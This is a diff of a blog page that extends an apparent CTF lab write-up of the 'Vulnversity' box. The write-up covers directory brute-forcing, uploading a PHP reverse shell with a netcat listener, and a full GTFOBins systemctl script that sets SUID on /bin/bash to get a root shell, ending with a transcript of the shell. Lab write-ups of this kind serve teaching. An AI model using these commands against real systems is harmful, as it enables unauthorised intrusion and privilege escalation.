@@ -1529,21 +1529,13 @@
       
 
       
-        <li class="navbarm__menu--item ">
-          <a href="/en/gallery">
+        <li class="navbarm__menu--item active">
+          <a href="/en/posts">
             CTF
             <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z"/></svg>
           </a>
         </li>
 
-        
-          <li class="navbarm__menu--item navbarm__menu--subitem">
-            <a href="/en/categories/cyberseclabs">Cyber Sec Labs</a>
-          </li>
-        
-          <li class="navbarm__menu--item navbarm__menu--subitem">
-            <a href="/en/categories/exploiteducation">Exploit Education</a>
-          </li>
         
           <li class="navbarm__menu--item navbarm__menu--subitem">
             <a href="/en/categories/hackthebox">Hack The Box</a>
@@ -1569,18 +1561,6 @@
       
         <li class="navbarm__menu--item active">
           <a href="/en/posts">Posts</a>
-        </li>
-      
-      
-    
-      
-      
-      
-      
-
-      
-        <li class="navbarm__menu--item ">
-          <a href="https://www.youtube.com/channel/UCA5LzPt919RJt681pidLFlg">youtube</a>
         </li>
       
       
@@ -1676,16 +1656,12 @@
   
   
   <div class="navbar__dropdown navbar__slide-down" data-ani="true">
-    <a href="/en/gallery" class="navbar__menu-item "
+    <a href="/en/posts" class="navbar__menu-item active"
       dir="ltr">
       CTF
       <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z"/></svg>
     </a>
     <div class="navbar__dropdown--content">
-      
-      <a href="/en/categories/cyberseclabs" class="navbar__dropdown--item" dir="ltr">Cyber Sec Labs</a>
-      
-      <a href="/en/categories/exploiteducation" class="navbar__dropdown--item" dir="ltr">Exploit Education</a>
       
       <a href="/en/categories/hackthebox" class="navbar__dropdown--item" dir="ltr">Hack The Box</a>
       
@@ -1703,14 +1679,6 @@
   
   
   <a href="/en/posts" class="navbar__menu-item navbar__slide-down active" dir="ltr" data-ani="true">Posts</a>
-  
-  
-  
-  
-  
-  
-  
-  <a href="https://www.youtube.com/channel/UCA5LzPt919RJt681pidLFlg" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">youtube</a>
   
   
   
@@ -1780,7 +1748,7 @@
 <div class="single__infos">
   <time class="single__info" title="Written At">📅&nbsp;May 8, 2022 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;4&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;7&nbsp;min read </span>
   
   &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;Atom</span>
   
@@ -1815,7 +1783,7 @@
   
   
 </figure>
-<h1 id="heading"></h1>
+<h2 id="kill-chain-summary">Kill Chain Summary</h2>
 <p>Vulnversiy  is the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some  directory&rsquo;s,  which helps To upload our shell codes. with help of securifera github page we can able to identify correct file  extension, gained user shell using weevely and escalated privilege using SUID bit binary with help of Gtfobins.</p>
 <h2 id="info-table">Info Table</h2>
 <table style="width:70%">
@@ -1965,7 +1933,8 @@
   
   
 </figure>
-<p>here there is a place to upload file, lets try to upload reverse shell file, in kali below directory we have set of php shell payloads. just modify attacker ip and port and upload</p>
+<p>here there is a place to upload file, lets try to upload reverse shell file, in kali  /usr/share/webshells/php/ directory we have set of php shell payloads. just modify attacker ip and port and upload</p>
+<p>but why php shell ?  PHP is one of the widely used languages for web development (more than 60%) which makes it one of the most targeted ones</p>
 <h2 id="reverse-shell">Reverse shell</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2029,7 +1998,7 @@
   
   
 </figure>
-<p>after our payload has been uploaded successfully, we need to find right directory ware our payload has been uploaded, again we will use directory search each suspicious directory</p>
+<p>after our payload has been uploaded, we need to find right directory ware our payload has been uploaded, again we will use directory search each suspicious directory</p>
 <figure >
   
   
@@ -2040,7 +2009,7 @@
   
   
 </figure>
-<p>we finded upload directory and it contains our payload, before accessing payload file, netcat listen on port which is configured on payload</p>
+<p>we finded uploads directory and it holds our payload, before accessing payload file, make sure netcat listen on port which has configured on payload</p>
 <h2 id="initial-foothold">Initial FootHold</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2075,7 +2044,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>yes, we got our initial foot hold, lets try to esculate privilege, lets list any SUID files</p>
-<h3 id="suid-files">SUID files</h3>
+<h2 id="suid-files">SUID files</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2140,7 +2109,65 @@
 </span></span><span class="line"><span class="cl">/sbin/mount.cifs
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p><a href="https://gtfobins.github.io/">GTFOBins</a> is a collection of Unix binaries that can be used to bypass local security restrictions in misconfigured systems</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="nv">TempFile</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">Type=oneshot
+</span></span></span><span class="line"><span class="cl"><span class="s1">ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">[Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TempFile</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$TempFile</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$TempFile</span>
+</span></span><span class="line"><span class="cl">/bin/bash -p
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>we have given suid permission to /bin/bash which can allow us to run bash as root.</p>
+<p>Systemctl is the tool used to control the systemd init service. systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks.</p>
+<p>TempFile=$(mktemp).service - we are creating an environment variable called “TempFile” (you can call it whatever you want). Within that variable we are calling the mktemp command to create a temporary file as a systemd service unit file (the “.service” part at the end)</p>
+<pre tabindex="0"><code>TempFile=$(mktemp).service
+</code></pre><p>the config we need our unit file to execute.</p>
+<pre tabindex="0"><code>[Service]
+ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+[Install]
+WantedBy=multi-user.target&#39; &gt; $TempFile
+</code></pre><p>The problem is that our current logged-in user does not have permission to write to /etc/systemd/system where this would normally go. We get around that by echoing our unit file one line at a time into the env variable we just created.</p>
+<p>echo ‘[Service] - calls the echo command to start echoing the input (notice the single quote? By not including the second single quote to close the line we are able to enter multiple single line inputs and complete our systemd unit file)</p>
+<p>[Service] - the first part of our unit file</p>
+<p><code>ExecStart=/bin/sh -c “chmod +s /bin/bash”</code> - when the service starts call the default system shell (the -c tells the shell to execute everything inside the quotes),<br />
+we have given suid permission to /bin/bash which can allow us to run bash as root.</p>
+<p>[Install] - the second part of our unit file</p>
+<p><code>WantedBy=multi-user.target’ &gt; $TempFile</code>- sets the state (or runlevel) at which this service will run (notice the closing single quote?), the &gt; directs all our inputs to the TempFile env variable</p>
+<p><code>/bin/systemctl link $TempFile</code> - per the systemctl man page, this makes our unit file available for systemctl commands even though it is outside of the standard search paths</p>
+<p><code>/bin/systemctl enable —now $TempFile</code> - “…Enable one or more units or unit instances. This will create a set of symlinks, as encoded in the <code>&quot;[Install]&quot;</code> sections of the indicated unit files. After the symlinks have been created, the system manager configuration is reloaded (in a way equivalent to daemon-reload), in order to ensure the changes are taken into account immediately. Note that this does not have the effect of also starting any of the units being enabled. If this is desired, combine this command with the <code>--now</code> switch…”</p>
+<h2 id="root-shell">Root shell</h2>
+<pre tabindex="0"><code>└──_ #nc -lvnp 8181                                                                                                                                                                           
+listening on [any] 8181 ...                                                                                                                                                                   
+connect to [10.18.105.26] from (UNKNOWN) [10.10.240.190] 60678                                                                                                                                
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux                                                                            
+ 21:38:51 up 26 min,  0 users,  load average: 0.00, 0.00, 0.02                                                                                                                                
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                                           
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                         
+/bin/sh: 0: can&#39;t access tty; job control turned off                                                                                                                                          
+$ id                                                                                                                                                                                          
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                               
+$ /bin/bash -p
+whoami
+root
+</code></pre><p>See You on the next Blog, Happy Hacking</p>
+
     </article>
     
     
@@ -3563,18 +3590,14 @@ document.addEventListener('DOMContentLoaded', function () {
           <nav id="TableOfContents">
   <ul>
     <li><a href="#road-map">Road Map</a></li>
-  </ul>
-
-  <ul>
+    <li><a href="#kill-chain-summary">Kill Chain Summary</a></li>
     <li><a href="#info-table">Info Table</a></li>
     <li><a href="#reconnaissance">Reconnaissance</a></li>
     <li><a href="#directory-search">directory search</a></li>
     <li><a href="#reverse-shell">Reverse shell</a></li>
-    <li><a href="#initial-foothold">Initial FootHold</a>
-      <ul>
-        <li><a href="#suid-files">SUID files</a></li>
-      </ul>
-    </li>
+    <li><a href="#initial-foothold">Initial FootHold</a></li>
+    <li><a href="#suid-files">SUID files</a></li>
+    <li><a href="#root-shell">Root shell</a></li>
   </ul>
 </nav>
         </div>
